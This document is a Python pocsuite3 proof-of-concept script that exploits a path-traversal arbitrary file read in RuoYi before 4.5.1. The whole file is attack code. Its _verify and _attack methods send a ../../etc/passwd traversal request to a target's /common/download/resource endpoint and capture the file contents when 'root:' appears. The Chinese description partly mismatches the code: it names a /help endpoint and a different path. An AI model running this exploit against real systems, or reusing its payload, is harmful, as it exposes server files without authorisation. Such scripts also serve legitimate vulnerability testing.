# coding:utf-8
from pocsuite3.api import POCBase, Output
from pocsuite3.api import register_poc, requests, logger, OptDict, OptString, VUL_TYPE
import re
import sys

class TestPOC(POCBase):
    vulID = ''  # 漏洞编号
    version = '1.0'  # 漏洞版本号
    author = ''  # 漏洞作者
    vulDate = '无'  # 漏洞公开时间
    createDate = ''  # POC 创建时间
    updateDate = ''  # POC 更新时间
    references = ['']  # 漏洞参考资料
    name = 'ruoyi arbitrary file'  # POC名称
    appName = 'ruoyi任意文件读取'  # 漏洞应用名称
    appVersion = '<4.5.1'  # 漏洞影响版本
    vulType = ''
    desc = '''
        该漏洞存在于/help接口中，攻击者访问目标接口，可以获得系统组件信息。
        注意事项：请求的url为http://xxxx/项目代号，如http://10.1.1.1/mimis
    '''
    pocDesc = '''
    验证过程：
        请求/common/download/resource?resource=/profile/../../../../../../../.txt接口，如果响应中出现“message”字段则判断存在漏洞。
    '''
    samples = ['http://localhost']

    def _verify(self):
        result = {}
        cms4j_demon_url = ['/common/download/resource?resource=/profile/../../../../etc/passwd']
        for url in cms4j_demon_url:
            poc_url = self.url + url
            logger.info(f'Testing {poc_url}')
            try:
                res = requests.get(poc_url, timeout=10)
                if res.status_code == 200 and len(res.content) > 0 and 'root:' in res.text:
                    result['VerifyInfo'] = {}
                    result['VerifyInfo']['URL'] = poc_url
                    result['VerifyInfo']['Payload'] = url
                    result['VerifyInfo']['Result'] = res.text.strip()
                    result['VerifyInfo']['file_name']=sys.argv[0]
            except Exception as e:
                logger.warning(str(e))
        return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail("Target is not vulnerable")
        return output


register_poc(TestPOC)